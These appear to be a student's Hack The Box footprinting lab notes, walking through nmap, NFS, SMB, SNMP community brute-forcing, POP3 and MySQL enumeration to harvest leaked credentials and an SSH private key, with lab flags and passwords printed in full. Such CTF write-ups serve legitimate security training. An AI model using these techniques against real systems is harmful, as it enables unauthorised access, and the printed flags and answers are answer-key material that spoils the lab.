Speed.#01........:   330.8 kH/s (2.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344384 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 45%

Started: Sat Aug 29 10:34:40 2026
Stopped: Sat Aug 29 10:35:14 2026

```

# Linux Remote Management Protocols

# Windows Remote Management Protocols

# Footprinting Lab - Easy

Q1. Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.

login with the creds in the ftp port 2121 and download the id_rsa 
connect using ssh and get the flag

```

ceil@NIXEASY:/home/flag$ ls
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
ceil@NIXEASY:/home/flag$ 


```

# Footprinting Lab - Medium

Q2. Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.



```
sudo nmap -sCV 10.129.137.74
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 12:18 +0530
Stats: 0:04:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.33% done; ETC: 12:22 (0:00:11 remaining)
Nmap scan report for 10.129.137.74
Host is up (0.37s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-29T06:50:06+00:00
|_ssl-date: 2026-08-29T06:50:15+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2026-08-28T05:45:25
|_Not valid after:  2027-02-27T05:45:25
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8s, deviation: 0s, median: 8s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-29T06:50:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.94 seconds
                                                                                                

```

```
showmount -e 10.129.137.74  
Export list for 10.129.137.74:
/TechSupport (everyone)
                            
```

```
└─$ mkdir -p /tmp/mountpoint
                                                                                                
┌──(satoru㉿satoru)-[/tmp]
└─$ sudo mount -t nfs 10.129.137.74:/TechSupport /tmp/mountpoint

```

```
cat ticket4238791283782.txt
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



---

```

connect to nfs share, access using the root privilege and read the ticket with variable size. you can get the password and use it against the other service.


something i missed was i didnt access the smbshare so it was a mistake from me not doing proper enumeration.

```
└─$ smbclient -U alex //10.129.137.74/devshare
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 10 21:42:22 2021
  ..                                  D        0  Wed Nov 10 21:42:22 2021
  important.txt                       A       16  Wed Nov 10 21:42:55 2021
get
                6367231 blocks of size 4096. 2585764 blocks available
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

now we can login to the mssqlclient.

Try run as administrator with the sa:< redacted > password and use windows auth to login.
![](Attachments/Pasted%20image%2020260829131917.png)

From dbodevsacc > top 200 rows 


![](Attachments/Pasted%20image%2020260829132713.png)


# Footprinting Lab - Hard

Q1.Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

```
sudo nmap -sCV 10.129.137.198             
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 20:13 +0530
Nmap scan report for 10.129.137.198
Host is up (0.39s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL CAPA SASL(PLAIN) USER AUTH-RESP-CODE TOP PIPELINING STLS
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more Pre-login have ID STARTTLS SASL-IR LOGIN-REFERRALS IDLE IMAP4rev1 AUTH=PLAINA0001 LITERAL+ listed capabilities OK post-login ENABLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: Pre-login more ID ENABLE SASL-IR LOGIN-REFERRALS IDLE IMAP4rev1 AUTH=PLAINA0001 LITERAL+ listed capabilities OK have post-login
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES SASL(PLAIN) UIDL CAPA USER TOP PIPELINING AUTH-RESP-CODE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds

```

```
onesixtyone -c /home/satoru/SecLists/Discovery/SNMP/snmp.txt 10.129.137.198
Scanning 1 hosts, 3219 communities
10.129.137.198 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ snmpbulkwalk -Cr1000 -c backup -v2c 10.129.137.198 > snmp_dump.txt
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ cat snmp_dump.txt             
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (122888) 0:20:28.88
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (123750) 0:20:37.50
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 08 1D 0F 01 14 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 142
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

```


```
nc -nv 10.129.137.198 110
(UNKNOWN) [10.129.137.198] 110 (pop3) open
+OK Dovecot (Ubuntu) ready.
USER tom
+OK
PASS NMds732Js2761
+OK Logged in.
STAT
+OK 1 3661
LIST 
+OK 1 messages:
1 3661
.
RETR 1
+OK 3661 octets
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
.


```

```
tom@NIXHARD:~/Maildir$ ss -tunlp
Netid   State    Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process   
udp     UNCONN   0         0            127.0.0.53%lo:53               0.0.0.0:*                
udp     UNCONN   0         0                  0.0.0.0:68               0.0.0.0:*                
udp     UNCONN   0         0                  0.0.0.0:161              0.0.0.0:*                
tcp     LISTEN   0         4096         127.0.0.53%lo:53               0.0.0.0:*                
tcp     LISTEN   0         128                0.0.0.0:22               0.0.0.0:*                
tcp     LISTEN   0         100                0.0.0.0:993              0.0.0.0:*                
tcp     LISTEN   0         100                0.0.0.0:995              0.0.0.0:*                
tcp     LISTEN   0         70               127.0.0.1:33060            0.0.0.0:*                
tcp     LISTEN   0         151              127.0.0.1:3306             0.0.0.0:*                
tcp     LISTEN   0         100                0.0.0.0:110              0.0.0.0:*                
tcp     LISTEN   0         100                0.0.0.0:143              0.0.0.0:*                
tom@NIXHARD:~/Maildir$ 0     sudo -l
0: command not found
tom@NIXHARD:~/Maildir$ sudo -l
[sudo] password for tom: 
tom@NIXHARD:~/Maildir$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on NIXHARD.
tom@NIXHARD:~/Maildir$ mysql -u tom -p'NMds732Js2761'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.01 sec)

mysql> describbe users;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'describbe users' at line 1
mysql> describe users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.01 sec)

mysql> select *  from users where username = "HTB";
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)

mysql> 

```


cool hard lab 

1. Initial Reconnaissance & Network Discovery

Ran an initial Nmap TCP scan against 10.129.137.198 (NIXHARD), revealing open ports for SSH (22), POP3 (110), IMAP (143), IMAPS (993), and POP3S (995).

Identified the target's hostname (NIXHARD) and domain (inlanefreight.htb) from the SSL certificates on the mail ports.

2. UDP Enumeration (SNMP Exploitation)

Recognizing the server's role as an internal management and account backup node, performed a targeted UDP scan on port 161.

Used onesixtyone to brute-force SNMP community strings, discovering the active string: backup.

Executed snmpbulkwalk to dump the MIB tree. The dump leaked a failed account execution command under the EXTEND MIB tree (/opt/tom-recovery.sh tom NMds732Js2761), revealing cleartext credentials for tom:NMds732Js2761.

3. Initial Access & Mail Enumeration

Connected to POP3 using tom's credentials and extracted an unencrypted RSA SSH private key (id_rsa) stored inside ~/Maildir/cur/.

Used the SSH key to authenticate directly to the target system as user tom.

4. Local Privilege & Service Enumeration (Current State)

Executed ss -tunlp on the target machine as tom and discovered a local MySQL service listening internally on 127.0.0.1:3306.

Target objective: Query this local MySQL instance to recover the domain backup records and retrieve the HTB user credentials.

